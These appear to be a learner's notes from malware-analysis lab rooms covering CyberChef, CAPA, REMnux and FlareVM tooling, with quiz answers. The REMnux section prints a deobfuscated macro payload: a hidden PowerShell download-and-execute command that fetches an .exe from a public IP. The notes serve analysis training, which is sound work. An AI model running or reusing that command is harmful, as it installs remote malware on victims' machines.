==============================================================================================================================================================================================================================================================================================================
#                                       CyberChef-The Basics
==============================================================================================================================================================================================================================================================================================================


## INTRODUCTION

- CyberChef is a simple, intuitive web-based application designed to help with various “cyber” operation tasks within your web browser
- It has set of tools, with all the equipments , to perfomr all defesnive task


## ACCESSING THE TOOL

- U can access the cyberchef either in online mode or offline ( on ur desktop )

1) ONLINE => All you need is a web browser and an internet connection. Then, you can click this [https://gchq.github.io/CyberChef/] to open CyberChef directly within your web browser.

2) OFFLINE => You can run this offline or locally on your machine by downloading the latest release file from this [https://github.com/gchq/CyberChef/releases]. This one works for both windows as well as linux



## Navigate the interface

- It has 4 components :

    - Operation
    - Recepie
    - Input
    - Output


### OPERATIONS

- This contains, different operaations that can be performed on the inputs


### RECIPE

- Here u drag operations u want to do and then modify it as per ur requirenments

- Save recepie => to save the operations
- Load recepie => allows userd to load prev operations
- clear recepie => clear chosen operation


### INPUT AREA

- It is space to input the text we want , in order to perform operations


### Output Area

- It gives us the result / output for the given input


1) In which area can you find "From Base64"?
=> Operations

2) Which area is considered the heart of the tool?
=> Recipe



## Before Anything Else

- There are few steps to keep in mind before stariting/ procedures to take care of .

    - Set a clear objective => Yes, u should know, what u are trying to convert it to !
    - Now put data into input field => The string, u wanna convert / find , is put into input field
    - select operation u wanna use => yes, now based on what u input, choose the operations u wanna convert it to
    - Check the output => Now check if the output is intended or no and if not, repeat from steps 1 to 3 again !



## Practice, Practice, Practice

- Lets learn about most used operations, so that u can know when to use it and how !

### EXTRACTORS

- We have IPv4 and IPv6 extractors, URL extractors and Email extractors as well.



### Date and Time

- Here we have 2 types, ` From UNIX Timestamp ` and ` to UNIX Timestamp `

- ` From UNIX Timestamp ` is like converting normal date and time into seconds

- ` TO UNIX TIMESTAMP ` is like converting seconds into normal date and time


### Data Format


-  Base encoding takes binary data (strings of 0s and 1s) and transforms it into a text-based representation using a specific set of ASCII (American Standard Code for Information Interchange) characters.

- Base code encodiings are => (Base64, 85, 58, 62)

- URL Decode => Converts URI/URL percent-encoded characters back to their raw values

- CyberChef is a powerful tool for handling various data transformations and decoding tasks.

- Whether you need to work with Base64, Binary, or URLs, this digital wizard's kitchen provides a visual interface that makes data manipulation intuitive and straightforward.

- With a diverse recipe library, you can confidently tackle tasks ranging from extracting email addresses, IP addresses, and domains. 

- To be honest, cyberchef is nothing but a tool avaiable online or can be downloaded which is used to conver the string / characters to hexadecm, base 64 and many other 










====================================================================================================================================================================================================================================================
CAPA: The Basics
==============================================================================================================================================================================================================================================================================================================================================================================


## INTRODUCTION

- When we are testing a malicious software, there are chances of our system to be corrupt or attacked as well / compromised, unless we have a sandbox or virtual machine enabled

- We have 2 types of analysis => Static and dynamic

- Today, we will using CAPA , learn static analysis

- It is designed to identify the capabilities present in executable files like Portable Executables (PE), ELF binaries, .NET modules, shellcode, and even sandbox reports.

- It does so by analyzing the file and applying a set of rules that describe common behaviours, allowing it to determine what the program is capable of doing, such as network communication, file manipulation, process injection, and many more.


## Tool Overview: How CAPA Works

1) What command-line option would you use if you need to check what other parameters you can use with the tool? Use the shortest format.
=> -h

2) What command-line options are used to find detailed information on the malware's capabilities? Use the shortest format.
=> -v

3) What command-line options do you use to find very verbose information about the malware's capabilities? Use the shortest format.
=> -vv

4) What PowerShell command will you use to read the content of a file?
=> Get-Content


## Dissecting CAPA Results Part 1: General Information, MITRE and MAEC

- First block contains :
    - cryptographic algorithms
    - analysis
    - OS
    - arch
    - path


### MITRE ATT&CK

- The MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) framework is a comprehensive global knowledge repository that meticulously documents the tactics and techniques employed by threat actors at every stage of a cyber-attack.

- It functions as a strategic playbook, providing detailed insights into attackers' methods, from gaining initial access to maintaining a presence, escalating privileges, evading defenses, moving laterally within a network, and much more.

- CAPA final output, what it does is compared the malware to MITRE framework and then detects the malware



### MAEC

- Malware Attribute Enumeration and Characterization is a specialized language designed to encode and communicate complex details concerning malware. 

- It contains an extensive range of attributes, including behaviours, artefacts, and interconnections among various instances of malware.

- This language functions as a standardized system for tracking and analyzing the complicated complexities of malware.




================================================================================================================================================
================================================================================================================================================
#                                                           REMnux: Getting Started
================================================================================================================================================
================================================================================================================================================


## INTRODUCTION

- So its really dangerous and risky to analyze malicious software, as there are chances it might effect our system as well.
- Now, for this we have REMnux, which acts like a sandbox and also do include all the tools required for testing the malicious software


## File Analysis

- In this task, we will use ` oledump.py`, which is a python tool, used for analysing OLE2 files

- OLE Stands for `object llinking and embedding` and are typically used to store multiple data types, such as documents, spreadsheets, and presentations, within a single file

- This tool , ie oledump will analysze and examine the contents of our file

- Now , i went to the target file, which was saved as `.xlsm` and i ran the followiing command : ` oledump.py file_name.xlsm` and when i ran this, i got contents , such as A1  A2  A3 ... and the one having ` M ` beside it is considered MACRO and this is what has to be searched more of.

- So now, i selected the file/option having M in it as follws: `oledump.py file_name.xlsm -s 4` where ` s ` stands for select and 4 is the number where `M` is available

- But the content for this , i in HEXA dec , so now to convert it to readable form use `-vbadecompress`

- The `vbadecompress` , wil make it readable , making it easier and readable.

- Now, ` oledump.py file_name.xlsm -s 4 --vbadecompress ` this commmand will give MACRO content in readable format

- Our interest here would be the value of `Sqtnew` because if you check the script, there is a Public IP, a PDF, and a .exe inside.

- Now , this has some weird stuff, so i went to -> CyberCheft -> pasted SQTnew into input and selected `replace` twice and then in the field change ` regux` to `simple string` and write `*` and `^`, because , in `sqtnew` these were bering repeated.

- When we do that we got a powershell command and it was as follows: `powershell -WindowStyle hidden -executionpolicy bypass; $TempFile = [IO.Path]::GetTempFileName() | Rename-Item -NewName { $_ -replace 'tmp$', 'exe' }  PassThru; Invoke-WebRequest -Uri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -OutFile $TempFile; Start-Process $TempFile;` WHERE :

    - WindowStyle parameter allows you to control how the PowerShell window appears when executing a script or command. In this case, hidden means that the PowerShell window won’t be visible to the user.

    -  The -executionpolicy parameter allows you to override this policy. The bypass means that the execution policy is temporarily ignored, allowing any script to run without restriction.

    - The Invoke-WebRequest is commonly used for downloading files from the internet.The -Uri Specifies the URL

    - The -OutFile specifies the local file where the downloaded content will be saved

    - The -OutFile specifies the local file where the downloaded content will be saved



## Fake Network to Aid Analysis

- During dynamic analysis, it is essential to observe the behaviour of potentially malicious software—especially its network activities.

-  there is a tool inside our REMnux VM called INetSim: Internet Services Simulation Suite! [ can be used for dynamic analysis]

- First we need to set some things : go to /etc/intetsim/inetsim.conf and then change the value of `#dns_default_ip 0.0.0.0` to `#dns_default_ip your_ip`

- After this , to see if value are executed , use the grep command as follows: ` cat /etc/inetsim/inetsim.conf | grep dns_default_ip`

- After this run ` sudo inetsim ` command

- Therefore , after this command our fake network will start running

- So then we went to attack box amd then openeed the https://ip and then in CLI , using `  sudo wget https://10.48.156.248/second_payload.zip --no-check-certificate` -> this will download file from the server

- Then when i stopped inetsim and then used `  sudo cat /var/log/inetsim/report/report.file_name.txt` i got the details of actions that had happened on the server/website

- So lets give a brief of what happens and how is this helpful !

    - You started INetSim, which creates a fake internet on your machine.

    - INetSim pretends to be real websites, DNS, HTTP/HTTPS servers, etc.

    - When you visited https://<your-ip> or used wget, your machine sent a request to INetSim.

    - INetSim responded with fake web pages or fake files, just like a real server.

    - This allowed you to download files from your fake server.


## Memory Investigation: Evidence Preprocessing

- One of the most common investigative practices in Digital Forensics is the preprocessing of evidence. This involves running tools and saving the results in text or JSON format

- The analyst often relies on tools such as Volatility when dealing with memory images as evidence. This tool is already included in the REMnux VM.

- We wil use this tool, not deep analysis tho, but just taste it !

- Here are some of the parameters or plugins we will use. We will focus on Windows plugins.

    - windows.pstree.PsTree
    - windows.pslist.PsList
    - windows.cmdline.CmdLine
    - windows.filescan.FileScan
    - windows.dlllist.DllList
    - windows.malfind.Malfind
    - windows.psscan.PsScan

- Now , in order to run this volatility, we can run it only as sudo su user !

- We will run each plugin after the command `vol3 -f wcry.mem`

### PsTree

- This plugin lists processes in a tree based on their parent process ID => `vol3 -f wcry.mem windows.pstree.PsTree`

### PsList

- This plugin is used to list all currently active processes in the machine => `vol3 -f wcry.mem windows.pslist.PsList`

### CmdLine

- This plugin is used to list process command line arguments.=> `vol3 -f wcry.mem windows.cmdline.CmdLine `


### FileScan

- This plugin scans for file objects in a particular Windows memory image. The results have more than 1,400 lines => ` vol3 -f wcry.mem windows.filescan.FileScan`


### DllList

- This plugin lists the loaded modules in a particular Windows memory image. Due to a text limitation, this one won't have a View Results icon => `vol3 -f wcry.mem windows.dlllist.DllList`


### PsScan

- This plugin is used to scan for processes present in a particular Windows memory image =>  ` vol3 -f wcry.mem windows.psscan.PsScan`


### Malfind

- This plugin is used to lists process memory ranges that potentially contain injected code. There won't be any View Results icon for this one due to text limitation => `  vol3 -f wcry.mem windows.malfind.Malfind`


- Volatility is a forensics tool used to analyze RAM memory dumps.

- Think of it like this: RAM = the brain of the computer and Volatility = a tool that reads that brain after a crime

- When malware runs, it stays in RAM. So Volatility helps you:
    - find malware processes

    - find injected code

    - see network connections

    - recover files

    - see what was running

- It’s used in incident response, malware analysis, DFIR, etc.

- What is a Volatility Plugin?
Volatility uses plugins, which are like small tools inside Volatility. Each plugin performs one specific job.



================================================================================================================================================
===============================================================================================================================================
# FlareVM: Arsenal of Tools
================================================================================================================================================
===============================================================================================================================================

## INTRODUCTION

 - FlareVM, or "Forensics, Logic Analysis, and Reverse Engineering," stands out as a comprehensive and carefully curated collection of specialized tools uniquely designed to meet the specific needs of reverse engineers, malware analysts, incident responders, forensic investigators, and penetration testers



 ## Arsenal of Tools

 - Here we will learn about tools used in FlareVM


 ### Reverse Engineering & Debugging

- Reverse engineering is like solving a puzzle backward: you take a finished product apart to understand how it works. Debugging is identifying errors, understanding why they happen, and correcting the code to prevent them.

- Ghidra - NSA-developed open-source reverse engineering suite.
- x64dbg - Open-source debugger for binaries in x64 and x32 formats.
- OllyDbg - Debugger for reverse engineering at the assembly level.
- Radare2 - A sophisticated open-source platform for reverse engineering.
- Binary Ninja - A tool for disassembling and decompiling binaries.
- PEiD - Packer, cryptor, and compiler detection tool.


### Disassemblers & Decompilers

- Disassemblers and Decompilers are crucial tools in malware analysis. They help analysts understand malicious software’s behaviour, logic, and co
ntrol flow by breaking it into a more understandable format

### Static & Dynamic Analysis

- Static and dynamic analysis are two crucial methods in cyber security for examining malware. Static analysis involves inspecting the code without executing it, while dynamic analysis involves observing its behaviour as it runs


### Forensics & Incident Response

- Digital Forensics involves the collection, analysis, and preservation of digital evidence from various sources like computers, networks, and storage devices. At the same time, Incident Response focuses on the detection, containment, eradication, and recovery from cyberattacks.


### Network Analysis

- Network Analysis includes different methods and techniques for studying and analysing networks to uncover patterns, optimize performance, and understand the underlying structure and behaviour of the network.


### File Analysis

- File Analysis is a technique used to examine files for potential security threats and ensure proper file permissions.


### Scripting & Automation

- Scripting and Automation involve using scripts such as PowerShell and Python to automate repetitive tasks and processes, making them more efficient and less prone to human error.

### Sysinternals Suite

- The Sysinternals Suite is a collection of advanced system utilities designed to help IT professionals and developers manage, troubleshoot, and diagnose Windows systems.


1) Which tool is an Open-source debugger for binaries in x64 and x32 formats?

=> x64dbg

2) What tool is designed to analyze and edit Portable Executable (PE) files?

=> CFF Explorer

3) Which tool is considered a sophisticated memory editor and process watcher?

=> Process Hacker


4) Which tool is used for Disc image acquisition and analysis for forensic use?

=> FTK Imager


5) What tool can be used to view and edit a binary file?
=> HxD




## Commonly Used Tools for Investigation: Overview


### Process Monitor (Procmon)

- lets you see, record, and keep track of system and Windows file activity in real-time. 


###  Process Explorer (Procexp)

- Process Explorer offers in-depth insights into the active processes running on your computer. It allows you to delve into the inner workings of your system, providing a comprehensive list of currently running processes and their linked user accounts


### HxD

- HxD is a quick and flexible hex editor for editing files, memory, and drives of any capacity. It can be applied to forensic investigation, data recovery, debugging, and exact manipulation of binary data.


### Wireshark

- Regarding network traffic analysis, Wireshark is a powerful tool that investigators may use to hunt down dubious connections, examine protocols, and spot possible assaults or data exfiltration


### PEStudio

- Static analysis, or studying executable file properties without running the files, is done with PEstudio.
- . PEstudio offers a variety of information about a file without putting users in danger of execution


### FLOSS

- Using advanced static analysis techniques, the FLARE Obfuscated String Solver (FLOSS, formerly FireEye Labs Obfuscated String Solver) automatically extracts and de-obfuscates all strings from malware programs.


1) Which tool was formerly known as FireEye Labs Obfuscated String Solver?

FLOSS

2) Which tool offers in-depth insights into the active processes running on your computer?

Process Explorer

3) Which powerful Windows tool is designed to help you record issues with your system's apps?

Procmon

4) Which tool can be used for Static analysis or studying executable file properties without running the files?

PEStudio

5) What tool can generate file hashes for integrity verification, authenticate the source of system files, and validate their validity?

CFF Explorer


## ANALYSING MALICIOUS FILES


- By utilizing all the tools mentioned in the prvious steps and task, i analyzed malicious file in a sandbox environment

1) Which API starts with R and indicates that the executable uses cryptographic functions?

RijndaelManaged

